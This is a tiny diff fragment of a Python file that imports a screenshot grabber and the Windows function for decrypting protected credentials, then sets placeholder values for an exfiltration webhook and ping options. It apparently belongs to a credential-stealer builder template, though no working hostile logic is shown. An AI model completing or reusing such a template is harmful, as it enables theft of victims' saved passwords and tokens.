@@ -24,7 +24,6 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 __WEBHOOK__ = "%webhook_here%"
-
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
